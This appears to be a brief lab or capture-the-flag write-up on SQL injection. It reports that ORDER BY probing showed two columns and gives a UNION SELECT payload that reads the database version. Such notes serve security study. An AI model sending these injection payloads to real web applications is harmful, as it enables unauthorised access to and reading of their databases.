When determining columns of database, both `UNION SELECT NULL` and `GROUP BY <1 OR 2 OR...>--+` do not work, but the `ORDER BY <1 OR 2 OR...>--+`. The result is 2 columns.

Final payload is:
```
' UNION SELECT VERSION(), VERSION();--+
```